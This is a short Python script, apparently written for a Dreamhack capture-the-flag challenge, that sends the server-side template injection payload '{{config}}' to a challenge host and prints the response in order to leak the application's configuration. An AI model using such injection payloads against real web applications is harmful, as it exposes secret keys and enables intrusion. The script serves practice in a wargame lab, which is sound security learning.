import requests

port = 15393
url_index = f"http://host3.dreamhack.games:{port}/"

r = requests.get(url_index + "{{config}}")
print(r.text)
